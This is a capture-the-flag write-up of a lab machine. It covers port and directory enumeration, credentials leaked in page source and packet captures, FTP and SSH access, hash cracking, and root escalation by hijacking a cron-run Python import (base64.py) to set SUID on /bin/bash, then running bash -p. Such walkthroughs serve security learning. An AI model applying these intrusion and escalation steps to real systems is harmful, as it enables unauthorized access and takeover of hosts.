As usual, starting with the machine enumeration

```
──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.0.148 -r 1-65535 -t 2000  
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Port scanning: Making networking exciting since... whenever.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.0.148:22
Open 10.10.0.148:80
Open 10.10.0.148:37370
...
```
```
┌──(kali㉿kali)-[~]
└─$ nmap -sC -Pn -A -p 22,80,37370 10.10.0.148      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-30 21:06 IST
Nmap scan report for 10.10.0.148
Host is up (0.17s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2:84:2a:c1:22:5a:10:f1:66:16:dd:a0:f6:04:62:95 (RSA)
|   256 42:9e:2f:f6:3e:5a:db:51:99:62:71:c4:8c:22:3e:bb (ECDSA)
|_  256 2e:a0:a5:6c:d9:83:e0:01:6c:b9:8a:60:9b:63:86:72 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
37370/tcp open  ftp     vsftpd 3.0.3
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.65 seconds

```
3 ports: SSH, HTTP and FTP on 37370

The site (at the port 80) is a normal website, nothing suspicious there. 

Using Ffuf to find the hidden directories:
```
┌──(kali㉿kali)-[~]
└─$ ffuf -u http://10.10.0.148/FUZZ -w /usr/share/wordlists/dirb/common.txt                

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.0.148/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 196ms]
                        [Status: 200, Size: 1163, Words: 176, Lines: 39, Duration: 199ms]
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 202ms]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 202ms]
gallery                 [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 193ms]
index.html              [Status: 200, Size: 1163, Words: 176, Lines: 39, Duration: 446ms]
pricing                 [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 608ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 167ms]
static                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 174ms]
:: Progress: [4614/4614] :: Job [1/1] :: 28 req/sec :: Duration: [0:00:36] :: Errors: 0 ::
```

`gallery`, `pricing` (and `index.html`) were available directly from the websites.

`static` is something interesting. But visiting static doesn't reveal anything; it's just a website showing the titles and nothing else.

Examining the gallery page, I saw the image to be clickable. So I clicked on it. And it opened a new tab with the URL:
![Screenshot 2024-06-30 212931](https://github.com/satyamraj17/HTB-THM-Writeups/assets/139890312/8f0165a4-67cb-4ba9-992a-eb531b99062f)

I tried with other numbers as well. But it was normal. It ends after the images are over.

I tried `0`, but it says URL not found. Somehow I thought of using `00` and it worked.

![Screenshot 2024-06-30 213027](https://github.com/satyamraj17/HTB-THM-Writeups/assets/139890312/ccada664-f66b-403b-8aae-ec1dadb7a85d)

![Screenshot 2024-06-30 213100](https://github.com/satyamraj17/HTB-THM-Writeups/assets/139890312/3ffffaf9-e57e-487d-bcf3-aefcf6d8f34a)

A login page.

After visiting a website, the most important thing to do is to check the **source code**. It may or may not reveal anything, but doing CTFs on picoctf,
I learned this, which I forgot while doing this lab.

Anyway, I checked the source code:
![Screenshot 2024-06-30 213950](https://github.com/satyamraj17/HTB-THM-Writeups/assets/139890312/64ef17d3-b8c8-4592-b802-fb4e93780f2d)

and
![Screenshot 2024-06-30 214131](https://github.com/satyamraj17/HTB-THM-Writeups/assets/139890312/69d578ef-6639-4dae-b320-6628fd440ff5)

A username and password.

Log in with the credentials.
![Screenshot 2024-06-30 214157](https://github.com/satyamraj17/HTB-THM-Writeups/assets/139890312/e319338c-c438-45d1-a1ee-85a4bac8e447)

_stop reusing credentials_. Interesting.

When I noticed an FTP port opened while doing the enumeration, I tried to connect to the FTP server as anonymous. But I couldn't. So, using the same password for FTP connection.

```
──(kali㉿kali)-[~]
└─$ ftp ftp://siemDev@10.10.0.148:37370
Connected to 10.10.0.148.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
ftp> 
```

```
ftp> ls
229 Entering Extended Passive Mode (|||26326|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000         7272 Mar 06  2023 siemFTP.pcapng
-rw-rw-r--    1 1000     1000      1978716 Mar 06  2023 siemHTTP1.pcapng
-rw-rw-r--    1 1000     1000      1972448 Mar 06  2023 siemHTTP2.pcapng
226 Directory send OK.
```

```
┌──(kali㉿kali)-[~/Desktop]
└─$ wget ftp://siemDev:california@10.10.0.148:37370/*
```

There were 3 pcap files, and I analysed all. But the 3th one, `siemHTTP2.pcapng` file has something.
![Screenshot 2024-06-30 215423](https://github.com/satyamraj17/HTB-THM-Writeups/assets/139890312/1d01adf7-cf3d-4ba6-95ca-8888077b23d7)

After getting the credentials in this file, I thought, why would I have checked the `siemFTP.pcapng.` file?

I have no idea about what the username and password are for. So, I tried to log in to SSH.

```
──(kali㉿kali)-[~/Desktop]
└─$ ssh valleyDev@10.10.0.148                            
The authenticity of host '10.10.0.148 (10.10.0.148)' can't be established.
ED25519 key fingerprint is SHA256:cssZyBk7QBpWU8cMEAJTKWPfN5T2yIZbqgKbnrNEols.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.0.148' (ED25519) to the list of known hosts.
valleyDev@10.10.0.148's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro
valleyDev@valley:~$ 
```

Then I uploaded Linux Smart Enumeration on the target and ran it.

I got some information from LSE. And then I checked for cronjobs.
```
valleyDev@valley:/$ cat /etc/crontab
...
1  *    * * *   root    python3 /photos/script/photosEncrypt.py

#
```
This file will be run by root. So, I thought if I could upload the reverse shell to this file, I could get the root shell. But I didn't have the write permission to this file.

I wondered and searched for more things. But couldn't get anything. Then I thought that I check the `/home` directory everytime I get a shell in any lab, which, again, I forgot to do here
I checked it.

There was a user named `valley`

There is a file aswell named `valleyAuthenticator`. The owner is valley. I copied it to my machine.

It was gibberish, so I used strings (idea from doing CTFs) and found a hash split into 2 lines- "e6722920bab2326f8217e4bf6b1b58ac".
I used Hashcat and got a password, which I tried to log in to the valley.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh valley@10.10.0.148                               
valley@10.10.0.148's password: 
Permission denied, please try again.
valley@10.10.0.148's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

valley@valley:~$ 
```
Here also, I ran the `id` command and found the user to be in the group of `valleyAdmin`.

Check what files are owned by this group:
```
valley@valley:~$ find / -group valleyAdmin 2>/dev/null
/usr/lib/python3.8
/usr/lib/python3.8/base64.py
...
```

```
valley@valley:/usr/lib/python3.8$ ls -l base64.py 
-rwxrwxr-x 1 root valleyAdmin 20382 Mar 13  2023 base64.py
```

When I discovered the 'photosEncrypt.py' from crontabs, I tried examining the code and found that it imports base64. And as valley, and being in the valleyAdmin group, I can edit the 
base64.py file.

And then upon searching on Google, I found of using the 'os' module in Python and then:
![Screenshot 2024-06-30 223000](https://github.com/satyamraj17/HTB-THM-Writeups/assets/139890312/7b1c0cfe-be55-415b-b1df-436163399401)

The photosEncrypt.py file runs every minute and after 1 minute, we will be getting this:
```
valley@valley:/photos/script$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

With SUID permissions on a binary, the next thing to do is to go to GTFO Bins.
```
valley@valley:/photos/script$ /bin/./bash -p
bash-5.0# whoami
root
bash-5.0# 
```

With that getting the root permission.
